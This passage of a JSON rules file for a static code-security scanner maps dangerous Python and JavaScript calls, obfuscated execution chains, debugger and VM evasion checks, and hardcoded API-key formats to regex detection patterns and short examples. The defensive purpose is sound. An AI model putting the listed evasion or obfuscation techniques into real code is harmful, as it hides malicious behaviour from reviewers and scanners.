        "example_vulnerable": "bytes.fromhex('6576616c')",
        "example_safe": "# Use string literals",
        "threat_actors": [
          "APT41"
        ],
        "mitigations": [
          "M1049"
        ]
      },
      "builtins_getattr": {
        "severity": "HIGH",
        "cvss": 7.5,
        "cwe": "CWE-506",
        "attack_id": "T1027.009",
        "tactic": "Defense Evasion",
        "description": "Accesses __builtins__ to hide function calls",
        "risk": "Evades static detection of eval/exec",
        "safe_alternative": "Direct function calls",
        "detection_pattern": "(__builtins__|getattr\\(__builtins__|__builtins__\\[)",
        "example_vulnerable": "getattr(__builtins__, 'eval')",
        "example_safe": "# Call functions directly",
        "threat_actors": [
          "APT28",
          "Turla"
        ],
        "mitigations": [
          "M1049"
        ]
      },
      "debugger_detection": {
        "severity": "MEDIUM",
        "cvss": 5.5,
        "cwe": "CWE-506",
        "attack_id": "T1497.001",
        "tactic": "Defense Evasion",
        "description": "Detects debuggers (anti-analysis)",
        "risk": "Evades debugging/analysis",
        "safe_alternative": "No legitimate need for debugger detection",
        "detection_pattern": "sys\\.gettrace\\s*\\(\\)",
        "example_vulnerable": "if sys.gettrace(): exit()",
        "example_safe": "# Remove anti-debug code",
        "threat_actors": [
          "Lazarus Group",
          "APT28"
        ],
        "mitigations": [
          "M1049"
        ]
      },
      "vm_detection": {
        "severity": "MEDIUM",
        "cvss": 5.5,
        "cwe": "CWE-506",
        "attack_id": "T1497.001",
        "tactic": "Defense Evasion",
        "description": "Detects virtual machines",
        "risk": "Evades sandboxed analysis",
        "safe_alternative": "No need for VM detection",
        "detection_pattern": "(VirtualBox|VMware|QEMU|Xen|vbox|vmx)",
        "example_vulnerable": "if 'VMware' in cpuinfo: exit()",
        "example_safe": "# Remove VM detection",
        "threat_actors": [
          "Emotet",
          "Trickbot"
        ],
        "mitigations": [
          "M1049"
        ]
      },
      "sleep_evasion": {
        "severity": "LOW",
        "cvss": 3.0,
        "cwe": "CWE-506",
        "attack_id": "T1497.003",
        "tactic": "Defense Evasion",
        "description": "Long sleep (sandbox evasion)",
        "risk": "Evades time-limited sandboxes",
        "safe_alternative": "Remove suspicious delays",
        "detection_pattern": "time\\.sleep\\s*\\(\\s*[3-9]\\d{2,}",
        "context_check": "Flag sleep > 300 seconds",
        "example_vulnerable": "time.sleep(3600)  # 1 hour",
        "example_safe": "# Reasonable delays only",
        "threat_actors": [
          "Emotet"
        ],
        "mitigations": [
          "M1049"
        ]
      }
    },
    "low": {
      "tempfile.mktemp": {
        "severity": "LOW",
        "cvss": 4.0,
        "cwe": "CWE-377",
        "description": "Creates temporary filename (deprecated, race condition)",
        "risk": "Race condition, symlink attacks",
        "safe_alternative": "tempfile.mkstemp() or TemporaryFile()",
        "detection_pattern": "tempfile\\.mktemp\\s*\\(",
        "example_vulnerable": "tmp = tempfile.mktemp()",
        "example_safe": "fd, tmp = tempfile.mkstemp()"
      },
      "input": {
        "severity": "LOW",
        "cvss": 3.0,
        "cwe": "CWE-95",
        "description": "Python 2 input() evaluates code (safe in Python 3)",
        "risk": "Code execution in Python 2.x only",
        "safe_alternative": "raw_input() in Python 2, input() safe in Python 3",
        "detection_pattern": "\\binput\\s*\\(",
        "example_vulnerable": "# In Python 2: input('Enter value: ')",
        "example_safe": "# Python 3: input() is safe"
      }
    }
  },
  "javascript": {
    "critical": {
      "eval": {
        "severity": "CRITICAL",
        "cvss": 9.8,
        "cwe": "CWE-95",
        "attack_id": "T1059.007",
        "description": "Executes arbitrary JavaScript code from string",
        "risk": "Complete system compromise, arbitrary code execution",
        "safe_alternative": "Refactor logic to avoid dynamic execution",
        "detection_pattern": "\\beval\\s*\\(",
        "example_vulnerable": "eval(userInput)",
        "example_safe": "// Refactor to avoid eval entirely",
        "cve_reference": "CVE-2025-54795"
      },
      "Function": {
        "severity": "CRITICAL",
        "cvss": 9.8,
        "cwe": "CWE-94",
        "attack_id": "T1059.007",
        "description": "Creates function from string (like eval)",
        "risk": "Arbitrary code execution",
        "safe_alternative": "Use normal function declarations",
        "detection_pattern": "new\\s+Function\\s*\\(|\\bFunction\\s*\\(",
        "example_vulnerable": "new Function('return ' + userCode)()",
        "example_safe": "function normalFunction() { /* ... */ }"
      },
      "setTimeout_string": {
        "severity": "CRITICAL",
        "cvss": 8.5,
        "cwe": "CWE-95",
        "attack_id": "T1059.007",
        "description": "setTimeout with string argument (evaluates code)",
        "risk": "Code execution",
        "safe_alternative": "Pass function reference",
        "detection_pattern": "setTimeout\\s*\\(\\s*['\"`]",
        "example_vulnerable": "setTimeout('alert(1)', 1000)",
        "example_safe": "setTimeout(() => alert(1), 1000)"
      },
      "setInterval_string": {
        "severity": "CRITICAL",
        "cvss": 8.5,
        "cwe": "CWE-95",
        "attack_id": "T1059.007",
        "description": "setInterval with string argument (evaluates code)",
        "risk": "Code execution",
        "safe_alternative": "Pass function reference",
        "detection_pattern": "setInterval\\s*\\(\\s*['\"`]",
        "example_vulnerable": "setInterval('doSomething()', 1000)",
        "example_safe": "setInterval(doSomething, 1000)"
      }
    },
    "high": {
      "child_process.exec": {
        "severity": "HIGH",
        "cvss": 8.6,
        "cwe": "CWE-78",
        "attack_id": "T1059.007",
        "description": "Executes shell command",
        "risk": "Command injection",
        "safe_alternative": "child_process.execFile() or spawn()",
        "detection_pattern": "child_process\\.exec\\s*\\(",
        "example_vulnerable": "exec(`ls ${userDir}`)",
        "example_safe": "execFile('ls', [userDir])",
        "cve_reference": "CVE-2025-54795"
      },
      "child_process.execSync": {
        "severity": "HIGH",
        "cvss": 8.6,
        "cwe": "CWE-78",
        "attack_id": "T1059.007",
        "description": "Executes shell command synchronously",
        "risk": "Command injection",
        "safe_alternative": "execFileSync() or spawnSync()",
        "detection_pattern": "child_process\\.execSync\\s*\\(",
        "example_vulnerable": "execSync(`rm ${userFile}`)",
        "example_safe": "execFileSync('rm', [userFile])",
        "cve_reference": "CVE-2025-54795"
      },
      "child_process.spawn_shell": {
        "severity": "HIGH",
        "cvss": 8.6,
        "cwe": "CWE-78",
        "attack_id": "T1059.007",
        "description": "Spawns process with shell: true",
        "risk": "Command injection",
        "safe_alternative": "spawn() with shell: false (default)",
        "detection_pattern": "spawn\\s*\\([^)]*shell\\s*:\\s*true",
        "context_check": "shell: true",
        "example_vulnerable": "spawn('ls', [dir], {shell: true})",
        "example_safe": "spawn('ls', [dir])  // shell: false is default"
      },
      "vm.runInNewContext": {
        "severity": "HIGH",
        "cvss": 7.5,
        "cwe": "CWE-94",
        "attack_id": "T1059.007",
        "description": "Runs code in new V8 context",
        "risk": "Sandbox escape possible",
        "safe_alternative": "Avoid if possible, use Worker threads",
        "detection_pattern": "vm\\.runInNewContext\\s*\\(",
        "example_vulnerable": "vm.runInNewContext(userCode)",
        "example_safe": "// Use Worker threads or avoid entirely"
      },
      "vm.runInThisContext": {
        "severity": "HIGH",
        "cvss": 8.0,
        "cwe": "CWE-94",
        "attack_id": "T1059.007",
        "description": "Runs code in current context",
        "risk": "Full access to current context",
        "safe_alternative": "Avoid dynamic code execution",
        "detection_pattern": "vm\\.runInThisContext\\s*\\(",
        "example_vulnerable": "vm.runInThisContext(code)",
        "example_safe": "// Avoid entirely"
      },
      "vm.runInContext": {
        "severity": "HIGH",
        "cvss": 7.5,
        "cwe": "CWE-94",
        "attack_id": "T1059.007",
        "description": "Runs code in specified context",
        "risk": "Sandbox escape possible",
        "safe_alternative": "Avoid dynamic code execution",
        "detection_pattern": "vm\\.runInContext\\s*\\(",
        "example_vulnerable": "vm.runInContext(userCode, context)",
        "example_safe": "// Avoid entirely"
      }
    },
    "medium": {
      "innerHTML": {
        "severity": "MEDIUM",
        "cvss": 6.5,
        "cwe": "CWE-79",
        "attack_id": "T1189",
        "description": "Sets HTML content (XSS risk)",
        "risk": "Cross-site scripting if user input",
        "safe_alternative": "textContent or DOM methods",
        "detection_pattern": "\\.innerHTML\\s*=",
        "example_vulnerable": "div.innerHTML = userInput",
        "example_safe": "div.textContent = userInput"
      },
      "outerHTML": {
        "severity": "MEDIUM",
        "cvss": 6.5,
        "cwe": "CWE-79",
        "attack_id": "T1189",
        "description": "Sets outer HTML (XSS risk)",
        "risk": "Cross-site scripting",
        "safe_alternative": "DOM methods",
        "detection_pattern": "\\.outerHTML\\s*=",
        "example_vulnerable": "element.outerHTML = userHTML",
        "example_safe": "// Use createElement and appendChild"
      },
      "document.write": {
        "severity": "MEDIUM",
        "cvss": 6.0,
        "cwe": "CWE-79",
        "attack_id": "T1189",
        "description": "Writes HTML to document (XSS risk)",
        "risk": "XSS, blocks parsing",
        "safe_alternative": "DOM methods (createElement, appendChild)",
        "detection_pattern": "document\\.write\\s*\\(",
        "example_vulnerable": "document.write(userHTML)",
        "example_safe": "element.appendChild(document.createTextNode(text))"
      },
      "insertAdjacentHTML": {
        "severity": "MEDIUM",
        "cvss": 6.5,
        "cwe": "CWE-79",
        "attack_id": "T1189",
        "description": "Inserts HTML adjacent to element (XSS risk)",
        "risk": "Cross-site scripting",
        "safe_alternative": "insertAdjacentText or DOM methods",
        "detection_pattern": "\\.insertAdjacentHTML\\s*\\(",
        "example_vulnerable": "elem.insertAdjacentHTML('beforeend', userHTML)",
        "example_safe": "elem.insertAdjacentText('beforeend', userText)"
      },
      "dangerouslySetInnerHTML": {
        "severity": "MEDIUM",
        "cvss": 6.5,
        "cwe": "CWE-79",
        "attack_id": "T1189",
        "description": "React prop for setting HTML (XSS risk)",
        "risk": "XSS if unsanitized",
        "safe_alternative": "Normal React elements",
        "detection_pattern": "dangerouslySetInnerHTML",
        "example_vulnerable": "<div dangerouslySetInnerHTML={{__html: userInput}} />",
        "example_safe": "<div>{sanitizedText}</div>"
      },
      "fs.writeFileSync": {
        "severity": "MEDIUM",
        "cvss": 6.0,
        "cwe": "CWE-73",
        "attack_id": "T1565.001",
        "description": "Writes file synchronously",
        "risk": "Path traversal, file overwrites",
        "safe_alternative": "Validate path, use async version",
        "detection_pattern": "fs\\.writeFileSync\\s*\\(",
        "example_vulnerable": "fs.writeFileSync(userPath, data)",
        "example_safe": "// Validate path is within allowed directory"
      },
      "fs.unlinkSync": {
        "severity": "MEDIUM",
        "cvss": 6.0,
        "cwe": "CWE-73",
        "attack_id": "T1485",
        "description": "Deletes file synchronously",
        "risk": "Path traversal, unauthorized deletion",
        "safe_alternative": "Validate path, use async version",
        "detection_pattern": "fs\\.unlinkSync\\s*\\(",
        "example_vulnerable": "fs.unlinkSync(userFile)",
        "example_safe": "// Validate file path first"
      },
      "fs.rmdirSync": {
        "severity": "MEDIUM",
        "cvss": 6.5,
        "cwe": "CWE-73",
        "attack_id": "T1485",
        "description": "Removes directory synchronously",
        "risk": "Path traversal, unauthorized deletion",
        "safe_alternative": "Validate path, use async version",
        "detection_pattern": "fs\\.rmdirSync\\s*\\(",
        "example_vulnerable": "fs.rmdirSync(userDir, {recursive: true})",
        "example_safe": "// Validate directory path first"
      }
    }
  },
  "obfuscation": {
    "base64": {
      "base64.b64decode": {
        "severity": "MEDIUM",
        "cvss": 6.0,
        "cwe": "CWE-506",
        "attack_id": "T1027",
        "description": "Base64 decoding (often used for obfuscation)",
        "risk": "Obfuscated malicious code",
        "detection_pattern": "base64\\.b64decode\\s*\\(",
        "example_suspicious": "exec(base64.b64decode('cHJpbnQoImhpZGRlbiIp'))"
      },
      "atob": {
        "severity": "MEDIUM",
        "cvss": 6.0,
        "cwe": "CWE-506",
        "attack_id": "T1027",
        "description": "Base64 decoding in JavaScript (atob)",
        "risk": "Obfuscated code",
        "detection_pattern": "\\batob\\s*\\(",
        "example_suspicious": "eval(atob('YWxlcnQoMSk='))"
      }
    },
    "hex": {
      "bytes.fromhex": {
        "severity": "MEDIUM",
        "cvss": 5.5,
        "cwe": "CWE-506",
        "attack_id": "T1027",
        "description": "Hex decoding (obfuscation technique)",
        "risk": "Hidden malicious code",
        "detection_pattern": "bytes\\.fromhex\\s*\\(",
        "example_suspicious": "exec(bytes.fromhex('7072696e742831').decode())"
      },
      "String.fromCharCode": {
        "severity": "MEDIUM",
        "cvss": 5.5,
        "cwe": "CWE-506",
        "attack_id": "T1027",
        "description": "Character code conversion (obfuscation)",
        "risk": "Obfuscated code",
        "detection_pattern": "String\\.fromCharCode\\s*\\(",
        "example_suspicious": "eval(String.fromCharCode(97, 108, 101, 114, 116))"
      }
    },
    "execution_chains": {
      "eval_compile": {
        "severity": "CRITICAL",
        "cvss": 9.5,
        "cwe": "CWE-94",
        "attack_id": "T1027",
        "description": "eval(compile(...)) - obfuscated execution",
        "risk": "Multi-stage code execution",
        "detection_pattern": "eval\\s*\\(\\s*compile\\s*\\(",
        "example_vulnerable": "eval(compile(base64.b64decode(data), '<>', 'exec'))"
      },
      "exec_base64": {
        "severity": "CRITICAL",
        "cvss": 9.5,
        "cwe": "CWE-94",
        "attack_id": "T1027",
        "description": "exec with base64 decode - obfuscated execution",
        "risk": "Hidden malicious code execution",
        "detection_pattern": "exec\\s*\\([^)]*b64decode",
        "example_vulnerable": "exec(base64.b64decode('...'))"
      },
      "eval_atob": {
        "severity": "CRITICAL",
        "cvss": 9.5,
        "cwe": "CWE-94",
        "attack_id": "T1027",
        "description": "eval with atob - obfuscated JavaScript execution",
        "risk": "Hidden code execution",
        "detection_pattern": "eval\\s*\\([^)]*atob",
        "example_vulnerable": "eval(atob('...'))"
      }
    }
  },
  "credentials": {
    "api_keys": {
      "anthropic_api_key": {
        "severity": "HIGH",
        "cvss": 8.0,
        "cwe": "CWE-798",
        "attack_id": "T1552.001",
        "description": "Hardcoded Anthropic API key",
        "risk": "API abuse, billing fraud",
        "detection_pattern": "sk-ant-[a-zA-Z0-9-]{95,}",
        "example_vulnerable": "api_key = 'sk-ant-api03-...'",
        "example_safe": "api_key = os.environ['ANTHROPIC_API_KEY']"
      },
      "openai_api_key": {
        "severity": "HIGH",
        "cvss": 8.0,
        "cwe": "CWE-798",
        "attack_id": "T1552.001",
        "description": "Hardcoded OpenAI API key",
        "risk": "API abuse, billing fraud",
        "detection_pattern": "sk-[a-zA-Z0-9]{48}",
        "example_vulnerable": "openai.api_key = 'sk-...'",
        "example_safe": "openai.api_key = os.getenv('OPENAI_API_KEY')"
      },
      "aws_access_key": {
        "severity": "HIGH",
        "cvss": 9.0,
        "cwe": "CWE-798",
        "attack_id": "T1552.001",
        "description": "Hardcoded AWS access key",
        "risk": "Cloud infrastructure compromise",
        "detection_pattern": "AKIA[0-9A-Z]{16}",
        "example_vulnerable": "aws_key = 'AKIAIOSFODNN7EXAMPLE'",
        "example_safe": "aws_key = os.environ['AWS_ACCESS_KEY_ID']"
      }
    }
  },
  "metadata": {
    "version": "2.0.0",
    "last_updated": "2025-10-23",
    "frameworks": {
      "mitre_attack": "v14.1",
      "mitre_atlas": "v4.5.0",
      "owasp_api": "2023",
      "owasp_top10": "2021",
      "cwe": "4.13"
    },
    "total_patterns": 70,
    "detection_strategies": {
      "ast_analysis": "Primary method for Python/JavaScript",
      "regex_patterns": "Fallback for obfuscation detection",
      "context_analysis": "Check shell=True, user input flow"
    }
  }
}